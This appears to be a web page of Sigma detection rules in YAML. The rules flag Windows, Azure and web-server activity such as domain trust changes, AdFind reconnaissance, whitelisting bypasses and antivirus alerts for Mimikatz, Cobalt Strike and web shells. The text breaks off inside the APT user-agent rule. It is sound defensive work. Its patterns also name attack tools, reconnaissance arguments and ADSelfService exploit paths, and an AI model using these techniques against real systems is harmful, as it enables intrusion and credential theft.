<li><a href="#">title:Addition of Domain Trusts id: 0255a820-e564-4e40-af2b-6ac61160335c status: stable description: Addition of domains is seldom and should be verified for legitimacy. author: Thomas Patzke date: 2019/12/03 tags: - attack.persistence - attack.t1098 logsource: product: windows service: security detection: selection: EventID: 4706 condition: selection falsepositives: - Legitimate extension of domain structure level: medium 
<li><a href="#">title:Addition of SID History to Active Directory Object id: 2632954e-db1c-49cb-9936-67d1ef1d17d2 status: stable description: An attacker can use the SID history attribute to gain additional privileges. references: - author: Thomas Patzke, @atc_project (improvements) date: 2017/02/19 tags: - attack.persistence - attack.privilege_escalation - attack.t1134.005 logsource: product: windows service: security detection: selection1: EventID: - 4765 - 4766 selection2: EventID: 4738 selection3: SidHistory: - '-' - '%%1793' filter_null: SidHistory: condition: selection1 or (selection2 and not selection3 and not filter_null) falsepositives: - Migration of an account into a new domain level: medium 
<li><a href="#">title:AdFind Usage Detection id: 9a132afa-654e-11eb-ae93-0242ac130002 status: test description: AdFind continues to be seen across majority of breaches. It is used to domain trust discovery to plan out subsequent steps in the attack chain. author: Janantha Marasinghe () references: - - - date: 2021/02/02 modified: 2021/02/02 tags: - attack.discovery - attack.t1482 - attack.t1018 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - 'domainlist' - 'trustdmp' - 'dcmodes' - 'adinfo' - ' dclist ' - 'computer_pwdnotreqd' - 'objectcategory=' - '-subnets -f' - 'name="Domain Admins"' - '-sc u:' - 'domainncs' - 'dompol' - ' oudmp ' - 'subnetdmp' - 'gpodmp' - 'fspdmp' - 'users_noexpire' - 'computers_active' condition: selection falsepositives: - Admin activity level: high 
<li><a href="#">title:ADFS Database Named Pipe Connection id: 1ea13e8c-03ea-409b-877d-ce5c3d2c1cb3 description: Detects suspicious local connections via a named pipe to the AD FS configuration database (Windows Internal Database). Used to access information such as the AD FS configuration settings which contains sensitive information used to sign SAML tokens. status: experimental date: 2021/10/08 modified: 2022/02/16 author: Roberto Rodriguez @Cyb3rWard0g references: - - - tags: - attack.collection - attack.t1005 logsource: product: windows category: pipe_created detection: selection: PipeName: '\MICROSOFT##WID\tsql\query' filter: Image|endswith: - '\Microsoft.IdentityServer.ServiceHost.exe' - '\Microsoft.Identity.Health.Adfs.PshSurrogate.exe' - '\AzureADConnect.exe' - '\Microsoft.Tri.Sensor.exe' - '\wsmprovhost.exe' - '\mmc.exe' - '\sqlservr.exe' - '\tssdis.exe' condition: selection and not filter falsepositives: - Processes in the filter condition level: high 
<li><a href="#">title:Admin User Remote Logon id: 0f63e1ef-1eb9-4226-9d54-8927ca08520a description: Detect remote login by Administrator user (depending on internal pattern). references: - tags: - attack.lateral_movement - attack.t1078.001 - attack.t1078.002 - attack.t1078.003 - car.2016-04-005 status: experimental author: juju4 date: 2017/10/29 modified: 2021/07/07 logsource: product: windows service: security definition: 'Requirements: Identifiable administrators usernames (pattern or special unique character. ex: "Admin-*"), internal policy mandating use only as secondary account' detection: selection: EventID: 4624 LogonType: 10 AuthenticationPackageName: Negotiate TargetUserName|startswith: 'Admin' condition: selection falsepositives: - Legitimate administrative activity. level: low 
<li><a href="#">title:ADSelfService Exploitation id: 6702b13c-e421-44cc-ab33-42cc25570f11 status: experimental description: Detects suspicious access to URLs that was noticed in cases in which attackers exploitated the ADSelfService vulnerability CVE-2021-40539 author: Tobias Michalski, Max Altgelt references: - date: 2021/09/20 logsource: category: webserver detection: selection: c-uri|contains: - '/help/admin-guide/Reports/ReportGenerate.jsp' - '/ServletApi/../RestApi/LogonCustomization' - '/ServletApi/../RestAPI/Connection' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Advanced IP Scanner id: bef37fa2-f205-4a7b-b484-0759bfd5f86f status: experimental description: Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups. references: - - - - - - author: '@ROxPinTeddy, Nasreddine Bencherchali @nas_bench' date: 2020/05/12 modified: 2021/12/18 tags: - attack.discovery - attack.t1046 - attack.t1135 logsource: category: process_creation product: windows detection: selection1: Image|contains: '\advanced_ip_scanner' selection2: CommandLine|contains|all: - '/portable' - '/lng' condition: 1 of selection* falsepositives: - Legitimate administrative use level: medium 
<li><a href="#">title:Advanced IP Scanner id: fed85bf9-e075-4280-9159-fbe8a023d6fa related: - id: bef37fa2-f205-4a7b-b484-0759bfd5f86f type: derived status: experimental description: Detects the use of Advanced IP Scanner. Seems to be a popular tool for ransomware groups. references: - - - - - author: '@ROxPinTeddy' date: 2020/05/12 modified: 2021/09/11 tags: - attack.discovery - attack.t1046 logsource: category: file_event product: windows detection: selection: TargetFilename|contains: '\AppData\Local\Temp\Advanced IP Scanner 2' condition: selection falsepositives: - Legitimate administrative use level: medium 
<li><a href="#">title:Advanced Port Scanner id: 54773c5f-f1cc-4703-9126-2f797d96a69d status: experimental description: Detects the use of Advanced Port Scanner. references: - author: Nasreddine Bencherchali @nas_bench date: 2021/12/18 tags: - attack.discovery - attack.t1046 - attack.t1135 logsource: category: process_creation product: windows detection: selection1: Image|contains: '\advanced_port_scanner' selection2: CommandLine|contains|all: - '/portable' - '/lng' condition: 1 of selection* falsepositives: - Legitimate administrative use - Tools with similar commandline (very rare) level: medium 
<li><a href="#">title:Adwind RAT / JRAT id: 0bcfabcb-7929-47f4-93d6-b33fb67d34d1 related: - id: 1fac1481-2dbc-48b2-9096-753c49b4ec71 type: derived status: experimental description: Detects javaw.exe in AppData folder as used by Adwind / JRAT references: - - author: Florian Roth, Tom Ueltschi, Jonhnathan Ribeiro, oscd.community date: 2017/11/10 modified: 2021/09/19 tags: - attack.execution - attack.t1059.005 - attack.t1059.007 logsource: category: file_event product: windows detection: selection: - TargetFilename|contains|all: - '\AppData\Roaming\Oracle\bin\java' - '.exe' - TargetFilename|contains|all: - '\Retrive' - '.vbs' condition: selection level: high 
<li><a href="#">title:Adwind RAT / JRAT id: 1fac1481-2dbc-48b2-9096-753c49b4ec71 status: experimental description: Detects javaw.exe in AppData folder as used by Adwind / JRAT references: - - author: Florian Roth, Tom Ueltschi, Jonhnathan Ribeiro, oscd.community date: 2017/11/10 modified: 2021/09/19 tags: - attack.execution - attack.t1059.005 - attack.t1059.007 logsource: category: process_creation product: windows detection: selection: - CommandLine|contains|all: - '\AppData\Roaming\Oracle' - '\java' - '.exe ' - CommandLine|contains|all: - 'cscript.exe' - 'Retrive' - '.vbs ' condition: selection level: high 
<li><a href="#">title:Adwind RAT / JRAT id: 42f0e038-767e-4b85-9d96-2c6335bad0b5 related: - id: 1fac1481-2dbc-48b2-9096-753c49b4ec71 type: derived status: experimental description: Detects javaw.exe in AppData folder as used by Adwind / JRAT references: - - author: Florian Roth, Tom Ueltschi, Jonhnathan Ribeiro, oscd.community date: 2017/11/10 modified: 2022/03/26 logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|startswith: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Details|startswith: '%AppData%\Roaming\Oracle\bin\' condition: selection level: high tags: - attack.execution - attack.t1059.005 - attack.t1059.007 
<li><a href="#">title:Alternate PowerShell Hosts id: 64e8e417-c19a-475a-8d19-98ea705394cc description: Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe status: test date: 2019/08/11 modified: 2022/04/21 author: Roberto Rodriguez @Cyb3rWard0g references: - tags: - attack.execution - attack.t1059.001 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection: ContextInfo: '*' filter: ContextInfo|contains: 'powershell.exe' # Host Application=...powershell.exe or Application hote=...powershell.exe in French Win10 event filter_citrix: ContextInfo|contains: 'ConfigSyncRun.exe' filter_adace: # Active Directory Administrative Center Enhancements ContextInfo|contains: 'C:\Windows\system32\dsac.exe' filter_winrm: ContextInfo|contains: 'C:\Windows\system32\wsmprovhost.exe -Embedding' condition: selection and not 1 of filter* falsepositives: - Programs using PowerShell directly without invocation of a dedicated interpreter - MSP Detection Searcher - Citrix ConfigSync.ps1 level: medium 
<li><a href="#">title:Alternate PowerShell Hosts id: d7326048-328b-4d5e-98af-86e84b17c765 related: - id: 64e8e417-c19a-475a-8d19-98ea705394cc type: derived description: Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe status: test date: 2019/08/11 modified: 2022/02/21 author: Roberto Rodriguez @Cyb3rWard0g references: - tags: - attack.execution - attack.t1059.001 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection: HostApplication: '*' filter: - HostApplication|startswith: 'C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe' - ContextInfo|contains: 'Citrix\ConfigSync\ConfigSync.ps1' condition: selection and not filter falsepositives: - Programs using PowerShell directly without invocation of a dedicated interpreter - MSP Detection Searcher - Citrix ConfigSync.ps1 level: medium 
<li><a href="#">title:Alternate PowerShell Hosts id: fe6e002f-f244-4278-9263-20e4b593827f description: Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe status: experimental date: 2019/09/12 modified: 2022/02/21 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.execution - attack.t1059.001 references: - logsource: product: windows category: image_load detection: selection: Description: 'System.Management.Automation' ImageLoaded|contains: 'System.Management.Automation' filter: - Image|endswith: - '\powershell.exe' - '\mscorsvw.exe' - Image|startswith: - 'C:\Program Files (x86)\Microsoft Visual Studio\' - 'C:\Program Files\Microsoft Visual Studio\' - 'C:\Windows\System32\' - 'C:\Program Files\Citrix\ConfigSync\' condition: selection and not filter falsepositives: - Unknown level: low 
<li><a href="#">title:Alternate PowerShell Hosts Pipe id: 58cb02d5-78ce-4692-b3e1-dce850aae41a status: test description: Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe author: Roberto Rodriguez @Cyb3rWard0g, Tim Shelton references: - date: 2019/09/12 modified: 2022/04/21 logsource: product: windows category: pipe_created detection: selection: PipeName|startswith: '\PSHost' filter1: Image|endswith: - '\powershell.exe' - '\powershell_ise.exe' - '\WINDOWS\System32\sdiagnhost.exe' - '\WINDOWS\System32\wsmprovhost.exe' - '\Windows\system32\dsac.exe' - '\Windows\system32\wbem\wmiprvse.exe' - '\ForefrontActiveDirectoryConnector.exe' - 'c:\windows\system32\inetsrv\w3wp.exe' # this is sad :,( but it triggers FPs on Exchange servers filter2: Image: null filter3: # Microsoft SQL Server\130\Tools\ Image|contains|all: - ':\Program Files' - '\Microsoft SQL Server\' Image|endswith: '\Tools\Binn\SQLPS.exe' filter4: Image|startswith: - 'C:\Program Files\Citrix\' - 'C:\Program Files\Microsoft\Exchange Server\' filter5: Image: 'C:\Windows\system32\ServerManager.exe' condition: selection and not 1 of filter* fields: - ComputerName - User - Image - PipeName falsepositives: - Programs using PowerShell directly without invocation of a dedicated interpreter. level: medium tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Always Install Elevated MSI Spawned Cmd And Powershell id: 1e53dd56-8d83-4eb4-a43e-b790a05510aa status: test description: This rule looks for Windows Installer service (msiexec.exe) spawned command line and/or powershell author: Teymur Kheirkhabarov (idea), Mangatas Tondang (rule), oscd.community references: - date: 2020/10/13 modified: 2021/11/27 logsource: product: windows category: process_creation detection: image: Image|endswith: - '\cmd.exe' - '\powershell.exe' parent_image: ParentImage|contains|all: - '\Windows\Installer\' - 'msi' ParentImage|endswith: 'tmp' condition: image and parent_image fields: - Image - ParentImage falsepositives: - Unknown level: medium tags: - attack.privilege_escalation - attack.t1548.002 
<li><a href="#">title:Always Install Elevated Windows Installer id: cd951fdc-4b2f-47f5-ba99-a33bf61e3770 description: This rule looks for Windows Installer service (msiexec.exe) trying to install MSI packages with SYSTEM privilege status: experimental author: Teymur Kheirkhabarov (idea), Mangatas Tondang (rule), oscd.community date: 2020/10/13 modified: 2022/02/18 references: - tags: - attack.privilege_escalation - attack.t1548.002 logsource: product: windows category: process_creation detection: integrity_level: IntegrityLevel: 'System' user: User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' image_1: Image|contains|all: - '\Windows\Installer\' - 'msi' Image|endswith: 'tmp' image_2: Image|endswith: '\msiexec.exe' filter_installer: ParentImage: 'C:\Windows\System32\services.exe' filter_repair: - CommandLine|endswith: '\system32\msiexec.exe /V' # ignore "repair option" - ParentCommandLine|endswith: '\system32\msiexec.exe /V' # ignore "repair option" condition: ( (image_1 and user) or (image_2 and user and integrity_level) ) and not 1 of filter* fields: - IntegrityLevel - User - Image falsepositives: - System administrator Usage level: medium 
<li><a href="#">title:An Application Is Uninstall id: 570ae5ec-33dc-427c-b815-db86228ad43e status: experimental description: An application have been remove check if it is a critical author: frack113 date: 2022/01/28 logsource: product: windows service: application detection: selection: Provider_Name: 'MsiInstaller' EventID: - 11724 - 1034 condition: selection falsepositives: - Unknown level: low tags: - attack.impact - attack.t1489 
<li><a href="#">title:Antivirus Exploitation Framework Detection id: 238527ad-3c2c-4e4f-a1f6-92fd63adb864 status: test description: Detects a highly relevant Antivirus alert that reports an exploitation framework author: Florian Roth references: - date: 2018/09/09 modified: 2022/05/12 logsource: category: antivirus detection: selection: Signature|contains: - 'MeteTool' - 'MPreter' - 'Meterpreter' - 'Metasploit' - 'PowerSploit' - 'CobaltStrike' - 'Swrort' - 'Rozena' - 'Backdoor.Cobalt' - 'CobaltStr' - 'COBEACON' - 'Cometer' - 'Razy' - 'IISExchgSpawnCMD' - 'Exploit.Script.CVE' condition: selection fields: - FileName - User falsepositives: - Unlikely level: critical tags: - attack.execution - attack.t1203 - attack.command_and_control - attack.t1219 
<li><a href="#">title:Antivirus Hacktool Detection id: fa0c05b6-8ad3-468d-8231-c1cbccb64fba description: Detects a highly relevant Antivirus alert that reports a hack tool or other attack tool status: experimental date: 2021/08/16 author: Florian Roth references: - logsource: category: antivirus detection: selection: - Signature|startswith: - 'HTOOL' - 'HKTL' - 'SecurityTool' - 'ATK/' # Sophos - Signature|contains: - 'Hacktool' condition: selection fields: - FileName - User falsepositives: - Unlikely level: high tags: - attack.execution - attack.t1204 
<li><a href="#">title:Antivirus Password Dumper Detection id: 78cc2dd2-7d20-4d32-93ff-057084c38b93 status: test description: Detects a highly relevant Antivirus alert that reports a password dumper author: Florian Roth references: - - date: 2018/09/09 modified: 2022/05/12 logsource: category: antivirus detection: selection: Signature|contains: - 'DumpCreds' - 'Mimikatz' - 'PWCrack' - 'HTool/WCE' - 'PSWTool' - 'PWDump' - 'SecurityTool' - 'PShlSpy' - 'Rubeus' - 'Kekeo' - 'LsassDump' - 'Outflank' - 'DumpLsass' condition: selection fields: - FileName - User falsepositives: - Unlikely level: critical tags: - attack.credential_access - attack.t1003 - attack.t1558 - attack.t1003.001 - attack.t1003.002 
<li><a href="#">title:Antivirus PrinterNightmare CVE-2021-34527 Exploit Detection id: 6fe1719e-ecdf-4caf-bffe-4f501cb0a561 status: stable description: Detects the suspicious file that is created from PoC code against Windows Print Spooler Remote Code Execution Vulnerability CVE-2021-34527 (PrinterNightmare), CVE-2021-1675 . references: - - - author: Sittikorn S, Nuttakorn T, Tim Shelton date: 2021/07/01 modified: 2022/03/22 tags: - attack.privilege_escalation - attack.t1055 logsource: category: antivirus detection: selection: Filename|contains: 'C:\Windows\System32\spool\drivers\x64\' keywords: - 'File submitted to Symantec' # symantec fp, pending analysis, more generic condition: selection and not keywords fields: - Signature - Filename - ComputerName falsepositives: - Unlikely, or pending PSP analysis level: critical 
<li><a href="#">title:Antivirus Ransomware Detection id: 4c6ca276-d4d0-4a8c-9e4c-d69832f8671f status: experimental description: Detects a highly relevant Antivirus alert that reports ransomware author: Florian Roth references: - date: 2022/05/12 logsource: category: antivirus detection: selection: Signature|contains: - 'Ransom' - 'Filecoder' condition: selection falsepositives: - Unlikely level: critical tags: - attack.t1486 
<li><a href="#">title:Antivirus Relevant File Paths Alerts id: c9a88268-0047-4824-ba6e-4d81ce0b907c description: Detects an Antivirus alert in a highly relevant file path or with a relevant file name status: experimental date: 2018/09/09 modified: 2021/11/23 author: Florian Roth, Arnim Rupp references: - logsource: category: antivirus detection: selection: - Filename|startswith: - 'C:\Windows\' - 'C:\Temp\' - 'C:\PerfLogs\' - 'C:\Users\Public\' - 'C:\Users\Default\' - Filename|contains: - '\Client\' - '\tsclient\' - '\inetpub\' - '/www/' - 'apache' - 'tomcat' - 'nginx' - 'weblogic' selection2: Filename|endswith: - '.asax' - '.ashx' - '.asmx' - '.asp' - '.aspx' - '.bat' - '.cfm' - '.cgi' - '.chm' - '.cmd' - '.dat' - '.ear' - '.gif' - '.hta' - '.jpeg' - '.jpg' - '.jsp' - '.jspx' - '.lnk' - '.php' - '.pl' - '.png' - '.ps1' - '.psm1' - '.py' - '.pyc' - '.rb' - '.scf' - '.sct' - '.sh' - '.svg' - '.txt' - '.vbe' - '.vbs' - '.war' - '.wsf' - '.wsh' - '.xml' condition: selection or selection2 fields: - Signature - User falsepositives: - Unlikely level: high tags: - attack.resource_development - attack.t1588 
<li><a href="#">title:Antivirus Web Shell Detection id: fdf135a2-9241-4f96-a114-bb404948f736 description: Detects a highly relevant Antivirus alert that reports a web shell. It's highly recommended to tune this rule to the specific strings used by your anti virus solution by downloading a big webshell repo from e.g. github and checking the matches. status: experimental date: 2018/09/09 modified: 2022/05/12 author: Florian Roth, Arnim Rupp references: - - - - - - - - - tags: - attack.persistence - attack.t1505.003 logsource: category: antivirus detection: selection: - Signature|startswith: - 'PHP/' - 'JSP/' - 'ASP/' - 'Perl/' - 'PHP.' - 'JSP.' - 'ASP.' - 'Perl.' - 'VBS/Uxor' # looking for 'VBS/' would also find downloaders and droppers meant for desktops - 'IIS/BackDoor' - 'JAVA/Backdoor' - 'Troj/ASP' - 'Troj/PHP' - 'Troj/JSP' - Signature|contains: - 'Webshell' - 'Chopper' - 'SinoChoper' - 'ASPXSpy' - 'Aspdoor' - 'filebrowser' - 'PHP_' - 'JSP_' - 'ASP_' # looking for 'VBS_' would also find downloaders and droppers meant for desktops - 'PHP:' - 'JSP:' - 'ASP:' - 'Perl:' - 'PHPShell' - 'Trojan.PHP' - 'Trojan.ASP' - 'Trojan.JSP' - 'Trojan.VBS' - 'PHP?Agent' - 'ASP?Agent' - 'JSP?Agent' - 'VBS?Agent' - 'Backdoor?PHP' - 'Backdoor?JSP' - 'Backdoor?ASP' - 'Backdoor?VBS' - 'Backdoor?Java' - 'PShlSpy' condition: selection fields: - FileName - User falsepositives: - Unlikely level: high 
<li><a href="#">title:AnyDesk Silent Installation id: 114e7f1c-f137-48c8-8f54-3088c24ce4b9 status: experimental author: JÃ¡n TrenÄanskÃ½ date: 2021/08/06 description: AnyDesk Remote Desktop silent installation can be used by attacker to gain remote access. references: - - tags: - attack.t1219 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - '--install' - '--start-with-win' - '--silent' condition: selection falsepositives: - Legitimate deployment of AnyDesk level: high fields: - CommandLine - ParentCommandLine - CurrentDirectory 
<li><a href="#">title:Anydesk Temporary Artefact id: 0b9ad457-2554-44c1-82c2-d56a99c42377 status: experimental description: | An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) references: - author: frack113 date: 2022/02/11 logsource: category: file_event product: windows detection: selection: TargetFilename|contains: - '\AppData\Roaming\AnyDesk\user.conf' - '\AppData\Roaming\AnyDesk\system.conf' TargetFilename|endswith: '.temp' condition: selection falsepositives: - Legitimate use level: medium tags: - attack.command_and_control - attack.t1219 
<li><a href="#">title:Apache Segmentation Fault id: 1da8ce0b-855d-4004-8860-7d64d42063b1 status: test description: Detects a segmentation fault error message caused by a creashing apache worker process author: Florian Roth references: - date: 2017/02/28 modified: 2021/11/27 logsource: service: apache detection: keywords: - 'exit signal Segmentation Fault' condition: keywords falsepositives: - Unknown level: high tags: - attack.impact - attack.t1499.004 
<li><a href="#">title:Apache Threading Error id: e9a2b582-3f6a-48ac-b4a1-6849cdc50b3c status: test description: Detects an issue in apache logs that reports threading related errors author: Florian Roth references: - date: 2019/01/22 modified: 2021/11/27 logsource: service: apache detection: keywords: - '__pthread_tpp_change_priority: Assertion `new_prio == -1 || (new_prio >= fifo_min_prio && new_prio <= fifo_max_prio)' condition: keywords falsepositives: - 3rd party apache modules - level: medium 
<li><a href="#">title:AppInstaller Attempts From URL by DNS id: 7cff77e1-9663-46a3-8260-17f2e1aa9d0a description: AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL status: experimental date: 2021/11/24 author: frack113 tags: - attack.command_and_control - attack.t1105 references: - - logsource: product: windows category: dns_query detection: selection: Image|startswith: C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_ Image|endswith: \AppInstaller.exe condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Application AppID Uri Configuration Changes id: 1b45b0d1-773f-4f23-aedc-814b759563b1 description: Detects when a configuration change is made to an applications AppID URI. author: Mark Morowczynski '@markmorow', Bailey Bercik '@baileybercik' date: 2022/06/02 references: - logsource: product: azure service: auditlogs detection: selection: properties.message: - Update Application - Update Service principal condition: selection falsepositives: - When and administrator is making legitmate AppID URI configuration changes to an application. This should be a planned event. level: high status: experimental tags: - attack.t1528 - attack.persistence - attack.credential_access 
<li><a href="#">title:Application URI Configuration Changes id: 0055ad1f-be85-4798-83cf-a6da17c993b3 description: Detects when a configuration change is made to an applications URI. URIs for domain names that no longer exist (dangling URIs), not using HTTPS, wildcards at the end of the domain, URIs that are no unique to that app, or URIs that point to domains you do not control should be investigated. author: Mark Morowczynski '@markmorow', Bailey Bercik '@baileybercik' date: 2022/06/02 references: - logsource: product: azure service: auditlogs detection: selection: properties.message: Update Application Sucess- Property Name AppAddress condition: selection falsepositives: - When and administrator is making legitmate URI configuration changes to an application. This should be a planned event. level: high status: experimental tags: - attack.t1528 - attack.persistence - attack.credential_access 
<li><a href="#">title:Application Using Device Code Authentication Flow id: 248649b7-d64f-46f0-9fb2-a52774166fb5 status: experimental description: | Device code flow is an OAuth 2.0 protocol flow specifically for input constrained devices and is not used in all environments. If this type of flow is seen in the environment and not being used in an input constrained device scenario, further investigation is warranted. This can be a misconfigured application or potentially something malicious. author: Mark Morowczynski '@markmorow', Bailey Bercik '@baileybercik' date: 2022/06/01 references: - logsource: product: azure service: signinlogs detection: selection: properties.message: Device Code condition: selection falsepositives: - Applications that are input constrained will need to use device code flow and are valid authentications. level: medium tags: - attack.t1078 - attack.defense_evasion - attack.persistence - attack.privilege_escalation - attack.initial_access 
<li><a href="#">title:Application Whitelisting Bypass via Bginfo id: aaf46cdc-934e-4284-b329-34aa701e3771 status: test description: Execute VBscript code that is referenced within the *.bgi file. author: Beyu Denis, oscd.community references: - - date: 2019/10/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\bginfo.exe' CommandLine|contains|all: - '/popup' - '/nolicprompt' condition: selection falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1059.005 - attack.defense_evasion - attack.t1218 - attack.t1202 
<li><a href="#">title:Application Whitelisting Bypass via DLL Loaded by odbcconf.exe id: 65d2be45-8600-4042-b4c0-577a1ff8a60e status: test description: Detects defence evasion attempt via odbcconf.exe execution to load DLL author: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community references: - - - date: 2019/10/25 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: '\odbcconf.exe' CommandLine|contains: - '-f' - 'regsvr' selection_2: ParentImage|endswith: '\odbcconf.exe' Image|endswith: '\rundll32.exe' condition: selection_1 or selection_2 falsepositives: - Legitimate use of odbcconf.exe by legitimate user level: medium tags: - attack.defense_evasion - attack.t1218.008 
<li><a href="#">title:Application Whitelisting Bypass via Dnx.exe id: 81ebd28b-9607-4478-bf06-974ed9d53ed7 status: test description: Execute C# code located in the consoleapp folder author: Beyu Denis, oscd.community references: - - date: 2019/10/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\dnx.exe' condition: selection falsepositives: - Legitimate use of dnx.exe by legitimate user level: medium tags: - attack.defense_evasion - attack.t1218 - attack.t1027.004 
<li><a href="#">title:Application Whitelisting Bypass via Dxcap.exe id: 60f16a96-db70-42eb-8f76-16763e333590 status: test description: Detects execution of of Dxcap.exe author: Beyu Denis, oscd.community, Nasreddine Bencherchali (update) references: - - date: 2019/10/26 modified: 2022/06/09 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\DXCap.exe' - OriginalFileName: 'DXCap.exe' selection_cli: CommandLine|contains: ' -c ' # The ".exe" is not required to run the binary condition: all of selection* falsepositives: - Legitimate execution of dxcap.exe by legitimate user level: medium tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:Application Whitelisting Bypass via PresentationHost.exe id: d22e2925-cfd8-463f-96f6-89cec9d9bc5f description: Detects usage of "PresentationHost" which is a utility that runs ".xbap" (Browser Applications) files. It can be abused to run malicious ".xbap" files any bypass AWL status: experimental references: - author: Nasreddine Bencherchali date: 2022/07/01 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\presentationhost.exe' - OriginalFileName: 'PresentationHost.exe' selection_cli: CommandLine|contains: '.xbap' filter: CommandLine|contains: # Filter out legitimate locations if you find them - 'C:\Windows\' - 'C:\Program Files' condition: all of selection* and not filter falsepositives: - Legitimate ".xbap" being executed via "PresentationHost" level: medium tags: - attack.defense_evasion - attack.execution - attack.t1218 
<li><a href="#">title:Applications That Are Using ROPC Authentication Flow id: 55695bc0-c8cf-461f-a379-2535f563c854 description: Resource owner password credentials (ROPC) should be avoided if at all possible as this requires the user to expose their current password credentials to the application directly. The application then uses those credentials to authenticate the user against the identity provider. author: Mark Morowczynski '@markmorow', Bailey Bercik '@baileybercik' date: 2022/06/01 references: - logsource: product: azure service: signinlogs detection: selection: properties.message: ROPC condition: selection falsepositives: - Applications that are being used as part of automated testing or a legacy application that cannot use any other modern authentication flow level: medium status: experimental tags: - attack.t1078 - attack.defense_evasion - attack.persistence - attack.privilege_escalation - attack.initial_access 
<li><a href="#">title:APT PRIVATELOG Image Load Pattern id: 33a2d1dd-f3b0-40bd-8baf-7974468927cc status: experimental description: Detects an image load pattern as seen when a tool named PRIVATELOG is used and rarely observed under legitimate circumstances references: - author: Florian Roth date: 2021/09/07 logsource: category: image_load product: windows detection: selection: Image|endswith: '\svchost.exe' ImageLoaded|endswith: '\clfsw32.dll' condition: selection falsepositives: - Rarely observed level: high tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 
<li><a href="#">title:APT User Agent id: 6ec820f2-e963-4801-9127-d8b2dce4d31b status: test description: Detects suspicious user agent strings used in APT malware in proxy logs author: Florian Roth, Markus Neis references: - Internal Research date: 2019/11/12 modified: 2021/11/30 logsource: category: proxy detection: selection: c-useragent: # APT Related - 'SJZJ (compatible; MSIE 6.0; Win32)' # APT Backspace - 'Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0' # APT GrizzlySteppe - ChopStick - US CERT - 'User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC' # Comment Crew Miniasp - 'Mozilla/4.0 (compatible; MSIE 7.4; Win32;32-bit)' # Comment Crew Miniasp - 'webclient' # Naikon APT - 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/200' # Naikon APT - 'Mozilla/4.0 (compatible; MSI 6.0;' # SnowGlobe Babar - yes, it is cut - 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0' # Sofacy - Xtunnel - 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:20.0) Gecko/20100101 Firefox/' # Sofacy - Xtunnel - 'Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/2' # Sofacy - Xtunnel - 'Mozilla/4.0' # Derusbi backdoor ELF - 'Netscape' # Unit78020 Malware - 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7' # Unit78020 Malware - 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Firefox/3.6.13 GTB7.1' # Winnti related - 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)' # Winnti related - 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)' # APT17 - 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; SV1)' # Bronze Butler - Daserf - 'Mozilla/4.0 (compatible; MSIE 11.0; Windows NT 6.1; SV1)' # Bronze Butler - Daserf - 'Mozilla/4.0 (compatible; MSIE 8.0; Win32)' # TSCookie - 'Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1' # Delphi downloader - 'Mozilla/6.1 (compatible; MSIE 9.0; Windows NT 5.3; Trident/5.0)' # VPNFilter - 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1)' # Sofacy User-Agent - 'Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko' # Sofacy User-Agent - 'Mozilla v5.1 *' # Sofacy Zebrocy samples - 'MSIE 8.0' # Sofacy Azzy Backdoor from - 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; 